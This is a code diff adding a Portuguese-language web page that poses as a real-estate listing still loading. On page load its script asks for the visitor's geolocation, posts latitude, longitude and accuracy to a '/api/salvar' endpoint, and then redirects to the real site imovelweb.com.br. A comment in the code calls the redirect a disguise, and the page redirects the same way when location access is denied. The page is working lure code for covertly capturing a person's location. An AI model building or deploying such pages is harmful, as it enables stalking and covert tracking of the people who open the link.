@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando Imóvel...</title>
+</head>
+<body>
+    <h2>Carregando informações do imóvel...</h2>
+    <p>Aguarde um momento.</p>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    let precisao = pos.coords.accuracy;
+
+                    // Envia os dados para a API da Vercel
+                    fetch('/api/salvar', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ lat, lon, precisao })
+                    }).then(() => {
+                        // Redireciona para um site real para disfarçar
+                        window.location.href = "https://www.imovelweb.com.br";
+                    });
+                }, function(err) {
+                    // Se ele negar, redireciona do mesmo jeito
+                    window.location.href = "https://www.imovelweb.com.br";
+                });
+            }
+        };
+    </script>
+</body>
+</html>
